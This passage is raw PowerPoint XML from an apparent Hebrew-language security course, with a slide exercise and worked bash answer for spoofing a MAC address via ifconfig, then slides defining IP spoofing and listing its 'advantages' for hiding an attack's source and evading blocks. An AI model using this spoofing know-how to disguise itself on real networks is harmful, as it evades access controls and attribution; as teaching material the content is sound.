              <a:t>החדשה.\</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דרישות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הסקריפט צריך לקבל מהמשתמש את שם כרטיס הרשת כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>eth0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>wlan0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הסקריפט צריך לקבל מהמשתמש את כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> החדשה כמו 00:11:22:33:44:55</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הסקריפט צריך לכבות את כרטיס הרשת, לשנות את כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ואז להפעיל מחדש את כרטיס הרשת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28449572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04CEA5-EDC4-45E7-804A-75A3DCCA852C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2335696" y="642594"/>
            <a:ext cx="8789504" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - זיוף כתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> - MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תשובה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D8331799-CDB1-4871-807A-1A5FC8C64C24}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נחלק את </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>התושבה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לכמה חלקים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תחילה נבדוק שאני </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>root</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> משום שרק </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>root</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכול לבצע כאלו שינויים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>if [[ $EUID -ne 0 ]]; then</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>   echo "This script must be run as root" </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>   exit 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Fi</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקוד הזה בודק אם הסקריפט רץ כ-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>root </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אם לא, הוא מדפיס הודעה ומפסיק את הריצה.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10890990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EC1907-29BC-46C4-B048-14004D986E1B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2335696" y="642594"/>
            <a:ext cx="8789504" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - זיוף כתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> - MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תשובה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E2B49338-3C25-466F-B38A-8BDCDC0FC4DC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>קבלת קלט מהמשתמש</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>read -p "Enter the network interface (e.g., eth0, wlan0): " </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>interface</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>read -p "Enter the new MAC address (e.g., 00:11:22:33:44:55): " </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>new_mac</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקוד הזה מקבל את שם כרטיס הרשת וכתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>החדשה מהמשתמש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כיבוי כרטיס הרשת</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ifconfig $interface down</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקוד הזה מכבה את כרטיס הרשת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10516232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0793985-6DD7-4E07-BFEF-DD89D4190086}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2176670" y="642594"/>
            <a:ext cx="8948530" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - זיוף כתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> - MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תשובה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0EDD0CCD-8251-454A-8500-1C9FE1C2D2A9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שינוי כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ifconfig $interface </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hw</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ether $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>new_mac</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקוד הזה משנה את כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>של כרטיס הרשת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הפעלת כרטיס הרשת מחדש</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ifconfig $interface up</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקוד הזה מפעיל את כרטיס הרשת מחדש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>6.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הצגת כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> החדשה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>echo "The MAC address for $interface has been changed to $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>new_mac</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקוד הזה מדפיס למשתמש את כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>החדשה.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2086418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C64B56C-39A7-4AAC-ACE7-50F9E579D016}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2276060" y="642594"/>
            <a:ext cx="8849139" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - זיוף כתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> - MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תשובה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CA2C46BC-A90F-43F9-B17E-F9037D11860C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ובסוף הסקריפט יראה כך:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>if </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>[[ $EUID -ne 0 ]]; then </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>echo "This script must be run as root" </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>exit 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> fi</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>read -p "Enter the network interface (e.g., eth0, wlan0): " interface</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>read -p "Enter the new MAC address (e.g., 00:11:22:33:44:55): " </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>new_mac</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ifconfig $interface down</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ifconfig $interface </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hw</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ether $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>new_mac</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ifconfig $interface up</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>echo "The MAC address for $interface has been changed to $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>new_mac</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>"</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33531165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ACA529-3E93-494B-84B5-2EDD84F7DC8B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3697356" y="642594"/>
            <a:ext cx="7427843" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP (IP Spoofing)</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{853CFE66-F9E2-47B9-AB68-C84B47511FC3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היא מזהה ייחודי שניתן למכשירים ברשת כדי לאפשר להם לתקשר עם מכשירים אחרים. זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הוא תהליך שבו תוקף שולח מנות מידע עם כתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מזויפת שמיועדת להטעות את השרתים או את מכשירים אחרים ברשת.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8094309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627193B-1DE8-4489-AB3D-67A8B17B6B8E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5486400" y="642594"/>
            <a:ext cx="5638800" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך – זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2C4974A5-D4E4-478C-95DE-9D57828014FA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>יתרונות של זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התחזות: ניתן לזייף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי להיראות כמו מיקום גאוגרפי שונה או כמכשיר לגיטימי במטרה לעקוף מגבלות גישה או חסימות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הסתרת מקור התקפה: זיוף כתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכול להסתיר את מקור ההתקפה או את הזהות של התוקף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>חסרונות של זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הגנה נגד התקפות: מערכות אבטחה רבות, כולל חומות אש ופתרונות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SIEM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מסוגלות לגלות פעילות חשודה המתרחשת עקב זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>חוסר עקביות: תוקף המנסה לזייף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> עלול להיתקל בקשיים אם יש צורך בקשרים חוזרים עם השרת, כמו בשירותים שדורשים אימות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3449411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8A1419-2F8B-44E1-9182-9EF48346A170}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5476460" y="642594"/>
            <a:ext cx="5648739" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך – זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
